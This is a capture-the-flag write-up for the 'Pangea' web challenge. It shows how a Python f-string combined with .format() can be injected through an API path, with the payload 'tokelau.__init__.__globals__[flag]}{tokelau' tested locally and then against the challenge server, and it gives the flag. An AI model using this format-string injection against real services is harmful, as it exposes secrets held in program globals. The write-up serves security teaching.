# Pangea

500 points

Web,
5 Solves as of Solving

## Description
I wrote an API to retrieve country codes. Can you help me test if it's secure?

## Given
main.py

# Solution 
This is an injection question of Python's f-strings and format syntax.
The idea is to inject something (lower CAPS) into `f'{{{country.lower()}.code}}'.format(**countries)` such that you can read the flag variable into the local namespace
1. The outer `{{` and `}}` will be condensed into `{` and `}` respectively through the f-strings
2. The `{country.lower()}` would be  replaced by the string
3. After that you are left with `{<string>.code}`, which will then be matched to the list `countries` to get the country code

So what we can do is this
1. Inside our string , we can put in some escape characters `}` and `{` such that we pass in the string `<variable to read>} {<normal country>`
2. After f-string formatting, we would be left with `{<variable to read>} {<normal country>.code)`, which would parse perfectly as an f-string

Let's test it out! The examples below are running on a local modified copy of the server, where I added some print statements for debugging.

## Tests on localhost
Try this: `/api/v1/{flag}}{tokelau`
```
{
  "Code": "{flag}TK", 
  "Name": "{flag}}{tokelau"
}
```
With this we proven that we can add ome other text besides the country name. Maybe it's possible to read some undesired variables?

`http://localhost:5000/api/v1/tokelau%7D%7Btokelau`
```
{
  "Code": "<__main__.Country object at 0x7f198da65438>TK", 
  "Name": "tokelau}{tokelau"
}
```
With this it may be possible to inject code to read the flag variable. If we get around the formatting accessing the country objects.


After searching around, I found out there is a way to access global objects. https://python-forum.io/Thread-str-format-security-vulnerability
So lets' try doing it by injecting this`tokelau.__init__.__globals__[flag]} {tokelau`

`http://localhost:5000/api/v1/tokelau.__init__.__globals__[flag]%7D%7Btokelau`
```
{
  "Code": "You did it locally! Go and do this on the actual websiteTK", 
  "Name": "tokelau.__init__.__globals__[flag]}{tokelau"
}
```

## Running on the actual thing
`http://challenges.csdc20t.ctf.sg:10045/api/v1/tokelau.__init__.__globals__[flag]%7D%7Btokelau`
```
{"Code":"CTFSG{BR0K3_TH3_AP1_OwO}TK","Name":"tokelau.__init__.__globals__[flag]}{tokelau"}
```

# Flag
`CTFSG{BR0K3_TH3_AP1_OwO}`